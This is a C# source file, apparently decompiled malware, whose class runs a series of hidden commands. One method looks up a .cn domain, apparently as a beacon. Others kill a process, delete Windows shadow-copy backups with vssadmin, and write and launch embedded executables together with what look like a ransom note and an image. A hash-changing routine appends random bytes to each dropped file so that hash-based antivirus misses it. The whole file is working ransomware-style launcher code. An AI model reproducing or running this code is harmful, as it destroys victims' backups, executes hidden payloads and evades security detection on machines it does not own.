using System;
using System.Diagnostics;
using System.IO;
using ekati.Properties;

namespace ekati;

internal class ThreadWork
{
	private static Logger logger = new Logger();

	private static Random random = new Random(Guid.NewGuid().GetHashCode());

	private static bool debug = true;

	public void ThreadOne()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "nslookup.exe";
			process.StartInfo.Arguments = "hunter.teamwork.cn";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			string text = "";
			while (!process.StandardOutput.EndOfStream)
			{
				text = text + "\t" + process.StandardOutput.ReadLine() + "\r\n";
			}
			string text2 = "";
			while (!process.StandardError.EndOfStream)
			{
				text2 = text2 + "\t" + process.StandardError.ReadLine() + "\r\n";
			}
			if (debug)
			{
				logger.AddtoLogFile("Executed command: \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
			}
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in ThreadOne: \r\n" + ex.Message);
		}
	}

	public void ThreadTwo()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "taskkill.exe";
			process.StartInfo.Arguments = "/IM svchosts.exe";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			string text = "";
			while (!process.StandardOutput.EndOfStream)
			{
				text = text + "\t" + process.StandardOutput.ReadLine() + "\r\n";
			}
			string text2 = "";
			while (!process.StandardError.EndOfStream)
			{
				text2 = text2 + "\t" + process.StandardError.ReadLine() + "\r\n";
			}
			if (debug)
			{
				logger.AddtoLogFile("Executed command: \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
			}
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in ThreadTwo: \r\n" + ex.Message);
		}
	}

	public void ThreadThree()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c vssadmin.exe delete shadows";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			string text = "";
			while (!process.StandardOutput.EndOfStream)
			{
				text = text + "\t" + process.StandardOutput.ReadLine() + "\r\n";
			}
			string text2 = "";
			while (!process.StandardError.EndOfStream)
			{
				text2 = text2 + "\t" + process.StandardError.ReadLine() + "\r\n";
			}
			if (debug)
			{
				logger.AddtoLogFile("Executed command: \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
			}
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in ThreadThree: \r\n" + ex.Message);
		}
	}

	public void ThreadFour()
	{
		try
		{
			string text = Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + random.Next(1000, 9999) + ".exe";
			File.WriteAllBytes(text, Resources.diamond);
			File.WriteAllBytes("message.html", Resources.html);
			File.WriteAllBytes("redback.jpg", Resources.redback);
			ChangeHash(text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c " + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			string text2 = "";
			while (!process.StandardOutput.EndOfStream)
			{
				text2 = text2 + "\t" + process.StandardOutput.ReadLine() + "\r\n";
			}
			string text3 = "";
			while (!process.StandardError.EndOfStream)
			{
				text3 = text3 + "\t" + process.StandardError.ReadLine() + "\r\n";
			}
			if (debug)
			{
				logger.AddtoLogFile("Executed command (diamond.exe): \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
			}
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in ThreadFour: \r\n" + ex.Message);
		}
	}

	public void ThreadFive()
	{
		try
		{
			string text = Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + random.Next(1000, 9999) + ".exe";
			File.WriteAllBytes(text, Resources.ruby);
			ChangeHash(text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c " + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			string text2 = "";
			while (!process.StandardOutput.EndOfStream)
			{
				text2 = text2 + "\t" + process.StandardOutput.ReadLine() + "\r\n";
			}
			string text3 = "";
			while (!process.StandardError.EndOfStream)
			{
				text3 = text3 + "\t" + process.StandardError.ReadLine() + "\r\n";
			}
			if (debug)
			{
				logger.AddtoLogFile("Executed command (ruby.exe): \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
			}
		}
		catch (Exception ex)
		{
			logger.AddtoLogFile("Error in ThreadFive: \r\n" + ex.Message);
		}
	}

	private void ChangeHash(string fileName)
	{
		try
		{
			byte[] array = new byte[256];
			random.NextBytes(array);
			array[254] = 0;
			array[255] = 0;
			_ = new FileInfo(fileName).Length;
			using FileStream fileStream = new FileStream(fileName, FileMode.Append);
			fileStream.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			throw new SystemException("\r\nChangeHash() method:\r\n" + ex.Message, ex);
		}
	}

	public void SetDebug(bool choice)
	{
		debug = choice;
	}
}
